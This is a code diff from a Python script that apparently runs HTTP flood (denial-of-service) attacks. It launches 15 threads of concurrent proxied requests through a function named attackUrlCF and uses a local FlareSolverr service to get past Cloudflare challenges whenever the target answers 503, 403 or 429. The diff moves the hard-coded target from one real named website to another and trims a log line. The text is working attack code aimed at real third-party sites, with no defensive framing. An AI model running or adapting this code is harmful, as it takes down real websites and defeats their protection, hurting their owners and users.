@@ -104,7 +104,7 @@ def attackUrlCF(baseUrl, threadNumber):
 				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
-			print('threadNum: ' + str(threadNumber), res)
+			print('threadNum: ' + str(threadNumber))
 			# print(res[0].content)
 			if str(res[0].status_code) in ['503', '403', '429']:
 				print('resolsing chalennge')
@@ -124,7 +124,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(15):
-	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
+	Thread(target=attackUrlCF, args=['https://royaloakinvestment.com/', i]).start()
 	time.sleep(30)
 input()
 
